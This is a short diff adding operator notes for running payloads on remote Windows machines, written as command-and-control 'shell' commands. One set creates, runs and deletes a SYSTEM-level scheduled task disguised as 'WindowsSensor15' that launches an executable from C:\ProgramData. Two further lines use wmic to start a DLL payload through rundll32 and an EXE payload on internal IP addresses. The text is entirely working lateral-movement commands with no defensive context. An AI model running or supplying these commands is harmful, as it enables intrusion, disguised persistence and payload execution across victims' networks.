@@ -1,0 +1,10 @@
+You can run payload or a batch file with SCHTASKS
+shell SCHTASKS /s api\hostname /RU "SYSTEM" /create /tn "WindowsSensor15" /tr "cmd.exe /c C:\ProgramData\P32.exe" /sc ONCE /sd 01/01/1970 /st 00:00
+shell SCHTASKS /s api\hostname /run /TN "WindowsSensor15"
+shell schtasks /S api/hostname /TN "WindowsSensor15" /DELETE /F
+
+To start the dll payload looks like this
+shell wmic /node:172.16.0.36 process call create "rundll32.exe C:\ProgramData\p64.dll StartW"
+
+ shell wmic /node:10.28.0.3 process call create "C:\ProgramData\j1.exe"
+Running the EXE payload
